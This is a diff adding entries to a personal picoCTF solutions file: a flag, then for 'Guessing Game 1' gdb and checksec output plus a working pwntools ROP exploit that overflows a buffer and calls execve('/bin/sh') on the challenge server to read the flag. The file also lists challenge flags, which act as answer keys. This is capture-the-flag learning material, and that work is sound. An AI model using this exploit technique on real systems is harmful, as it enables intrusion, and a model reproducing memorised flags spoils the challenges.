@@ -205,3 +205,95 @@ picoCTF{73176001,67867967}
 30. la cifra de
 picoCTF{b311a50_0r_v1gn3r3_c1ph3rdAAB11d9}
 using: https://cryptii.com/pipes/vigenere-cipher/
+----------------
+31. Nothing Up My Sleeve
+picoCTF{c0ngr4ts_0n_y0ur_s4n1ty}
+-------------
+32. Guessing Game 1
+
+gdb ./vuln
+run
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400c9b in win ()
+
+
+
+(gdb) info registers
+rax            0x160               352
+rbx            0x400400            4195328
+rcx            0x0                 0
+rdx            0x6bcdf0            7065072
+rsi            0x0                 0
+rdi            0x1                 1
+rbp            0x6161616161616161  0x6161616161616161
+rsp            0x7fffffffdc18      0x7fffffffdc18
+r8             0x160               352
+r9             0x160               352
+r10            0xfffffeab          4294966955
+r11            0x246               582
+r12            0x401aa0            4201120
+r13            0x0                 0
+r14            0x6ba018            7053336
+r15            0x0                 0
+rip            0x400c9b            0x400c9b <win+75>
+eflags         0x10202             [ IF RF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+fs_base        0x6be880            7071872
+gs_base        0x0                 0
+
+
+
+└─$ checksec --file=./vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1847 Symbols      No    0 0./vuln
+
+
+input:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+script.py:
+from pwn import *
+
+HOST = "shape-facility.picoctf.net"
+PORT = 54725   # use the port shown on your challenge page
+
+pop_rdi = 0x4006a6
+pop_rax = 0x4005af
+pop_rsi = 0x410b93
+pop_rdx = 0x410602
+syscall = 0x40138c
+bss = 0x6bc3a0
+write_gadget = 0x447abb
+
+payload = b"A" * 120
+payload += p64(pop_rdi) + p64(bss)
+payload += p64(pop_rsi) + b"/bin/sh\x00"
+payload += p64(write_gadget)
+payload += p64(pop_rax) + p64(59)
+payload += p64(pop_rdi) + p64(bss)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rdx) + p64(0)
+payload += p64(syscall)
+
+io = remote(HOST, PORT)
+
+io.recvuntil(b"guess?")
+io.sendline(b"84")
+
+io.recvuntil(b"Name?")
+io.sendline(payload)
+
+io.interactive()
+
+
+when get shell run:
+ls
+cat flag.txt
+
+picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}
